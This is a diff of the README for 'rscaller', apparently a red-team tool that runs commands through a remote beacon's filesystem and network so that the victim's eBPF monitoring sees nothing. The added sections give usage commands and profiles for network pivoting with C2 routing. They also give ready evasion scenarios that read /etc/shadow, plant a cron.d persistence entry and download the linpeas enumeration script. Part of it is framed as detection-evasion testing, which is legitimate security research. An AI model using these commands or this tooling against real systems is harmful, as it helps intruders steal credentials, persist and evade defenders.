@@ -102,7 +102,7 @@ rscaller/
 
 **Evasion testing (`scripts/test_evasion_baseline.sh`):**
 - Attacker VM (`dev-vm-rscaller`): `fuse3`, `libfuse3-dev` — required for `rscfuse` mount
-- Victim VM (`dev-vm-rscaller-clone`): [`tracee`](https://github.com/aquasecurity/tracee) — auto-downloaded to `/tmp/tracee` if missing
+- Victim VM (`dev-vm-rscaller-clone`): Docker — `poc.sh` runs [`tracee`](https://github.com/aquasecurity/tracee) in a privileged container (`aquasec/tracee:latest`)
 - Enum tools (fetched at runtime): [`lse.sh`](https://github.com/diego-treitos/linux-smart-enumeration) (default, fast) or [`linpeas`](https://github.com/carlospolop/PEASS-ng)
 
 ## Build
@@ -292,33 +292,55 @@ ls /mnt/target/etc/hostname          # → beacon's /etc/hostname via FUSE
 are local; at or above it are beacon PIDs with the offset stripped on signal relay.
 The offset is defined in `rscfuse/src/procfs.rs` and `rsclient/src/relay.rs`.
 
-### Custom profiles
+### Custom profiles & inheritance
 
 Built-in profiles live in `rsc/profiles/*.yaml` and are embedded at compile time.
-Copy one as a starting point for a custom profile:
 
-```bash
-cp rsc/profiles/full.yaml ~/.config/rsc/profiles/myprofile.yaml
-# edit to add/remove mount entries, then:
-sudo rsc exec --mount-profile myprofile -- hostname
+#### Using extends: for DRY profiles
 
-# Or pass a path directly:
-sudo rsc exec --mount-profile /path/to/profile.yaml -- hostname
-```
-
-Profile YAML format:
+All scenario profiles extend `base`, which provides common mounts and network syscalls.
+Create custom profiles by extending `base`:
 
 ```yaml
-name: myprofile
-description: "What this profile does"
-mounts:
-  - remote: /proc          # path on beacon filesystem
-    local: /proc           # where to bind-mount it locally
-    type: bind             # only 'bind' is supported today
-  - remote: /etc/hostname
-    local: /etc/hostname
-    optional: true         # skip silently if path is absent on beacon
+name: my-pivot
+extends: base
+description: "Internal pivoting: access multiple segments via beacon"
+
+forward:
+  - name: custom-routing
+    syscalls: [socket, connect, bind, listen, accept4, sendto, recvfrom, sendmsg, recvmsg, getsockopt, setsockopt]
+    filter:
+      net_routes:
+        - subnet: "192.168.1.0/24"
+          direction: REMOTE
+        - subnet: "10.0.0.0/8"
+          direction: REMOTE
+        - subnet: "0.0.0.0/0"
+          direction: LOCAL
 ```
+
+Save to `~/.config/rsc/profiles/my-pivot.yaml` or `/etc/rsc/profiles/my-pivot.yaml`, then:
+
+```bash
+sudo rsc exec --mount-profile my-pivot --beacon host:9999 -- cmd
+```
+
+#### Scenario profiles with network routing
+
+- **`beacon-local`**: Red team scenario — beacon's identity + selective routing (target REMOTE, C2/internet LOCAL)
+- **`recon-routed`**: Reconnaissance — beacon's network visible in /proc + optional routing
+
+Use with `--route` CLI args to customize network forwarding:
+
+```bash
+sudo rsc exec --beacon host:9999 \
+  --mount-profile beacon-local \
+  --route "192.168.1.0/24=remote" \
+  --route "0.0.0.0/0=local" \
+  -- ./beacon
+```
+
+See `docs/design/NETWORK_ROUTING.md` for complete routing policy and examples.
 
 ### Write operations
 
@@ -415,6 +437,41 @@ bash scripts/poc.sh --profile full --no-tracee --beacon dev-vm-2 --client dev-vm
 
 Tracee (eBPF) runs on the beacon and watches `execve`/`execveat`.
 **Zero events = command executed locally**, data came from beacon via FUSE.
+
+### Baseline-vs-evasion comparison
+
+`poc.sh` can also run a command twice — once directly on the beacon (baseline,
+no rscaller) and once via `rsc exec` (evasion) — under two separate tracee
+capture windows, then print matching-event counts for both and a PASS/FAIL
+verdict. Tracee `--events` and the event-matching `--query` are both
+configurable (`--query` matches against `processName`, `eventName`, and any
+event arg, case-insensitive, OR of comma-separated substrings).
+
+Three ready-made scenarios (`--scenario exec|file|network`):
+
+```bash
+make poc-scenario SCENARIO=exec      # cat /etc/shadow — execve/execveat
+make poc-scenario SCENARIO=file      # plant a cron.d entry — file-write events
+make poc-scenario SCENARIO=network   # curl-download linpeas.sh — socket/DNS/TCP/UDP events
+
+# 2-pane tmux window (rsclient | rsbeacon) for screenshotting a run:
+make poc-scenario-tmux SCENARIO=network
+```
+
+Or build your own comparison directly:
+
+```bash
+bash scripts/poc.sh --compare --profile ghost \
+  --cmd "cat /mnt/target/etc/shadow" \
+  --baseline-cmd "cat /etc/shadow" \
+  --events execve,execveat --query cat
+
+# equivalently:
+make poc-compare PROFILE=ghost CMD="cat /mnt/target/etc/shadow" \
+  BASELINE_CMD="cat /etc/shadow" QUERY=cat
+```
+
+See `bash scripts/poc.sh --help` for the full flag list.
 
 ## Test
 
